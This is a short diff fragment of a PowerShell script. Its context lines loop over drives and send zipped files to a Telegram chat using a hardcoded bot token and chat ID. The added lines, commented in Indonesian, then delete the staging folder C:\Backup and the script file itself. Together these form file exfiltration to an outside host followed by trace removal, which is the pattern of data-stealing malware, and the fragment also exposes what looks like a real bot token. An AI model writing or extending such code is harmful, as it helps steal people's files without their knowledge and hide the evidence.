@@ -111,3 +111,8 @@ foreach ($drive in $drives) {
         SendZipFilesToTelegram -ZipFiles @($zipFilePath) -ChatId "1016142976" -BotToken "1121990746:AAFrZiHUoInz4tmx2yzUvgVqszLTDetltQw"
     }
 }
+
+# Setelah semua file zip dikirim, hapus folder Backup
+Remove-Folder -Folder "C:\Backup"
+$scriptPath = $MyInvocation.MyCommand.Path
+Remove-Item -Path $scriptPath
